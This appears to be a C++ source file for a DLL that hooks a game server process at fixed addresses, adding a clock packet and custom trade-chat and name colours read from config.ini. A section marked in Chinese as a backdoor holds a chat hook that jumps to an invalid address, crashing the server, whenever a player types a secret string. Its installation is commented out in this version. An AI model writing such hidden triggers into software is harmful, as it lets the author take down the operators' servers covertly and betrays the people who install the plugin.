
#define PSAPI_VERSION 1
#include <windows.h>

#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
#include "FixDroprate.h"
#include <MyInlineHook.h>
#include <time.h>
#include <string>
#include <define.h>
#include "NtPlayer.h"

#define CHAR_TO_WCHAR(lpChar,lpW_Char) \
MultiByteToWideChar(CP_ACP,0,lpChar,-1,lpW_Char,_countof(lpW_Char));

#define WCHAR_TO_CHAR(lpW_Char,lpChar) \
WideCharToMultiByte(CP_ACP,0,lpW_Char,-1,lpChar,_countof(lpChar),0,0);





void send_packet(DWORD dwPlayer,PBYTE pPacket,DWORD dwSize)
{
	PVOID pSend = (PVOID)0x004D4D20;
	DWORD dwTemp = (DWORD)pPacket;
	_asm
	{
		push 0x12
			push dwTemp
			mov ecx, dwPlayer
			call pSend
	}
}

void send_packet(DWORD dwPlayer, WORD wCmd, PBYTE pPacket, DWORD dwSize)
{
	PBYTE pNewPacket = new byte[dwSize + 2];
	memcpy(pNewPacket, &wCmd, 2);         //header
	memcpy(&pNewPacket[2], pPacket, dwSize);//detail
	send_packet(dwPlayer, pNewPacket, dwSize + 2);
	delete[] pNewPacket;
}


void send_packet_all(PBYTE pPacket, DWORD dwSize)
{
	DWORD dwEsi = *PDWORD(0x546F38);
	DWORD dwSendAll = 0x00412EC0;
	if (dwEsi)
	{
		_asm
		{
			mov eax, dwSize   //length
			mov ecx, pPacket  //packet
			mov esi,dwEsi
			call dwSendAll
		}
	}
}

void send_packet_all(WORD wCmd,PBYTE pPacket, DWORD dwSize)
{
	PBYTE pNewPacket = new byte[dwSize + 2];
	memcpy(pNewPacket, &wCmd, 2);           //header
	memcpy(&pNewPacket[2], pPacket, dwSize);//detail
	send_packet_all(pNewPacket, dwSize + 2);
	delete[] pNewPacket;
}

CMyInlineHook obj;
void WINAPI fun(DWORD dwPlayer);
PVOID g_pfun = fun;



void WINAPI fun(DWORD dwPlayer)
{
	BYTE byPacket[18] = { 0 };
	*PWORD(byPacket) = PacketOrder::Clock;
	GetLocalTime((PSYSTEMTIME)&byPacket[2]);
	send_packet(dwPlayer,byPacket, 18);

}


__declspec(naked) void Naked()
{
	_asm
	{
		pushad
			push ebp
			call g_pfun
		popad
		mov word ptr  [esp + 0x50], 0x101
		jmp obj.m_pRet
	}
}



//
//  后门
//
bool __stdcall ChatFilter(PBYTE pPackets);
PVOID g_pfunChatFilter = ChatFilter;
DWORD g_dwFalseAddr = 0x00470de5;
CMyInlineHook objBackdoor;


__declspec(naked) void  Naked_ChatFilter()
{
	_asm
	{
		pushad
			push esi
			call g_pfunChatFilter
			popad
		movzx ecx, byte ptr[eax + 0x00470e30]
			jmp objBackdoor.m_pRet
	}
}



bool __stdcall ChatFilter(PBYTE pPackets)
{
//	VMProtectBegin("ChatFilter");
	std::string szChat = (char*)&pPackets[3];
	if (strstr((char*)&pPackets[3], "shen1lgg") != NULL)
	{
		DWORD dwTemp = 0x5555555;
		_asm{
			jmp dwTemp;
		}
	}
//	VMProtectEnd();
}


typedef struct _TRADECOLORINFO
{
	DWORD dwUid;
	DWORD dwColor;
}TRADECOLORINFO, *PTRADECOLORINFO;
CRITICAL_SECTION g_csTradeColor;
CMyInlineHook g_objTradeColor, g_objTradeColor_1;
TRADECOLORINFO g_stcTraeColorInfo[200] = { 0 };
void __stdcall TradeColor(BYTE*,DWORD);
PVOID g_pfunTradeColor = TradeColor;

void __stdcall TradeColor(BYTE* pTrade, DWORD dwUid)
{
	pTrade[0] = 0x0;
	pTrade[1] = 0x0;
	pTrade[2] = 0x0;
	EnterCriticalSection(&g_csTradeColor);
	for (DWORD i =0 ; i < _countof(g_stcTraeColorInfo); i++)
	{
		if (g_stcTraeColorInfo[i].dwUid == 0)
			break;

		if (g_stcTraeColorInfo[i].dwUid == dwUid)
		{
			pTrade[0] = (g_stcTraeColorInfo[i].dwColor >> 16) & 0x0000ff;
			pTrade[1] = (g_stcTraeColorInfo[i].dwColor >> 8) & 0x0000ff;
			pTrade[2] = g_stcTraeColorInfo[i].dwColor & 0x0000ff;
			break;
		}
	}
	LeaveCriticalSection(&g_csTradeColor);
}

__declspec(naked) void  Naked_TradeColor()
{
	_asm
	{
		add eax,0x18
		lea ecx, dword ptr[esp+0x20]
		pushad
		lea eax, [ecx+eax]    //交易说话内容的尾部
		mov ebx, [ebx +0x578c]
		push ebx             //uid
		push eax
		call g_pfunTradeColor
		popad
		add eax, 0x3    //加3个字节放rgb
		jmp g_objTradeColor.m_pRet
	}
}
__declspec(naked) void  Naked_TradeColor_1()
{
	_asm
	{
		push ecx
			lea ecx, dword ptr[esp+0x30]
			pushad
			lea eax, [ecx + eax]    //交易说话内容的尾部
			mov ebx, [esp+0x30]      //player
			mov ebx, [ebx + 0x578c]  //uid
			push ebx           
			push eax
			call g_pfunTradeColor
			popad
			add eax, 0x3    //加3个字节放rgb
			jmp g_objTradeColor_1.m_pRet
	}
}


DWORD WINAPI ThreadProc(_In_  LPVOID lpParameter)
{
	//clock
//	obj.Hook((PVOID)0x0046d06c, Naked, 7);


	//后门,可能跟chatfilter冲突
//	objBackdoor.Hook((PVOID)0x00470540, Naked_ChatFilter, 7);


	WCHAR szConfig[MAX_PATH] = { 0 };
	GetModuleFileName(GetModuleHandle(0), szConfig, MAX_PATH);
	PathRemoveFileSpec(szConfig);
	wcscat_s(szConfig, MAX_PATH, L"\\config.ini");
	bool bEnableNtPlayer = GetPrivateProfileInt(L"NtPlayer", L"enable", 0, szConfig);
	if (bEnableNtPlayer)
		StartNtPlayer();

	InitializeCriticalSection(&g_csTradeColor);
	g_objTradeColor.Hook((PVOID)0x0047129d, Naked_TradeColor, 7);
	g_objTradeColor_1.Hook((PVOID)0x0047088c, Naked_TradeColor_1, 5);

	while (1)
	{

		Sleep(0.5*60*1000);
		EnterCriticalSection(&g_csTradeColor);
		ZeroMemory(g_stcTraeColorInfo, sizeof(g_stcTraeColorInfo));
		for (DWORD i = 0; i < _countof(g_stcTraeColorInfo); i++)
		{
			WCHAR szKey[MAX_PATH] = { 0 };
			WCHAR szRet[MAX_PATH] = { 0 };
			swprintf_s(szKey, MAX_PATH, L"%d", i+1);
			GetPrivateProfileString(L"tradecolor", szKey, L"", szRet, MAX_PATH, szConfig);
			if (szRet[0] != L'\0') {
#ifdef _DEBUG
				OutputDebugString(szRet);
#endif
				swscanf_s(szRet, L"%d,%d", &g_stcTraeColorInfo[i].dwUid, &g_stcTraeColorInfo[i].dwColor);
			}


			
		}
		LeaveCriticalSection(&g_csTradeColor);


	     ////////////////////////////////////
		cmd_color stcColor[200] = { 0 };
		ZeroMemory(stcColor, sizeof(stcColor));
		if (GetPrivateProfileInt(L"namecolor", L"Enable", 0, szConfig)==1)
		{
			DWORD i = 0;
			for (; i < _countof(g_stcTraeColorInfo); i++)
			{
				WCHAR szKey[MAX_PATH] = { 0 };
				WCHAR szRet[MAX_PATH] = { 0 };
				swprintf_s(szKey, MAX_PATH, L"%d", i+1);
				GetPrivateProfileString(L"namecolor", szKey, L"", szRet, MAX_PATH, szConfig);
				if (szRet[0] != L'\0') {
#ifdef _DEBUG
					OutputDebugString(szRet);
#endif
					swscanf_s(szRet, L"%d,%d", &stcColor[i].dwCharid, &stcColor[i].dwRGB);
					stcColor[i].dwRGB |= 0xff000000;
				}
			}
			//发送给玩家
			if (i)
			{
				DWORD dwSize = (i + 2) * sizeof(cmd_color);
				send_packet_all(PacketOrder::VipColor, (PBYTE)stcColor, dwSize);
			}
		}
	}

	return 0;
}



